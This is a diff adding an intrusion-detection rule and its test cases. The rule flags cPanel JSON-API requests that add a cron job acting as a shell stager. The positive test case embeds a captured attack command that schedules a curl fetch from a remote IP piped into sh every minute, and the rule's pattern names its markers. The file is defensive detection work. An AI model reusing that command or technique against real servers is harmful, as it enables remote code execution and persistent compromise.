@@ -1,0 +1,45 @@
+name: "MALWARE cPanel JSON-API Cron add_line Shell Stager Persistence"
+
+rule: >-
+  alert http $EXTERNAL_NET any -> $HOME_NET any
+  (msg:"MALWARE cPanel JSON-API Cron add_line Shell Stager Persistence";
+  flow:to_server,established;
+  http.method; content:"GET";
+  http.uri; content:"/json-api/cpanel?";
+  content:"cpanel_jsonapi_module=Cron"; fast_pattern;
+  content:"cpanel_jsonapi_func=add_line";
+  content:"command=";
+  pcre:"/command=[^&]*(?:RCEOK|%2Fslw|%2Fslt|public_html%2F\.s\.txt)/i";
+  classtype:attempted-admin;
+  sid:1000898005; rev:1;
+  metadata:created_at 2026_10_21, deployment Ingress;)
+
+tests:
+  - name: "positive-captured-cpanel-cron-addline-slw"
+    expected_sids: [1000898005]
+    request:
+      client_ip: 123.202.208.37
+      method: GET
+      uri: "/cpsess1234567890/json-api/cpanel?cpanel_jsonapi_user=svc123456&cpanel_jsonapi_module=Cron&cpanel_jsonapi_func=add_line&cpanel_jsonapi_apiversion=2&command=echo+RCEOK+%3E%2Fhome%2Fsvc123456%2Fpublic_html%2F.s.txt%3B+%28curl+-fsSL+-m180+http%3A%2F%2F92.119.178.59%3A8988%2Fslw%29%7Csh&minute=%2A&hour=%2A&day=%2A&month=%2A&weekday=%2A"
+      host: "10.0.0.25:2087"
+      port: 8080
+      headers:
+        User-Agent: "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0 Safari/537.36"
+
+  - name: "negative-legitimate-cpanel-cron-addline"
+    expected_sids: []
+    request:
+      client_ip: 198.51.100.10
+      method: GET
+      uri: "/cpsess1234567890/json-api/cpanel?cpanel_jsonapi_user=alice&cpanel_jsonapi_module=Cron&cpanel_jsonapi_func=add_line&cpanel_jsonapi_apiversion=2&command=%2Fusr%2Fbin%2Fphp+%2Fhome%2Falice%2Fpublic_html%2Fwp-cron.php&minute=0&hour=%2A&day=%2A&month=%2A&weekday=%2A"
+      host: "10.0.0.25:2083"
+      port: 8080
+
+  - name: "negative-cpanel-listaccts"
+    expected_sids: []
+    request:
+      client_ip: 198.51.100.10
+      method: GET
+      uri: "/cpsess1234567890/json-api/listaccts?api.version=1"
+      host: "10.0.0.25:2087"
+      port: 8080
